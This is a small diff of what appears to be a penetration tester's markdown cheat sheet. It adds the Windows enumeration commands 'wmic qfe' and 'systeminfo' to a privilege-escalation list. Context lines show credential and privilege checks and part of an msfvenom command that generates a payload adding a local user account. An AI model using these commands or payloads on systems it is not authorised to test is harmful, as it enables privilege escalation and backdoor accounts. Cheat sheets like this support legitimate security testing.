@@ -2,6 +2,8 @@
 ## privesc
 ### windows
 ```
+wmic qfe
+systeminfo
 cmdkey /list
 whoami /all
 wmic logicaldisk get name
@@ -297,6 +299,7 @@ msfvenom -a x86 --platform Windows -p windows/exec CMD="net user /add lopsy a123
   krbrelayx
   gdb-peda-pwndbg-gef
   ```
+
 
 
 
